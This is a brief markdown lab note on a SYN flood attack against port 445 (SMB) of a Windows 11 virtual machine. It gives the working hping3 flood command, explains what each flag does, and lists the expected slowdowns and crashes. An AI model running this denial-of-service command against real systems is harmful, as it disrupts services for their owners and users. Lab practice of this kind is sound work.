# SYN Flood Attack (CPU/RAM Stress)

## Effects:
- High CPU and RAM usage on the Windows 11 VM.
- If SMB (file sharing) is enabled, the system may slow down or crash.

## Command:
```bash
sudo hping3 -S --flood -p 445 <Target-IP>
```

## Explanation:

- `-S` → Sends SYN flag, initiating a TCP handshake(three way handshake).
- `--flood` → Sends packets continuously.
- `-p 445` → Targets Port 445 (SMB - Windows File Sharing).
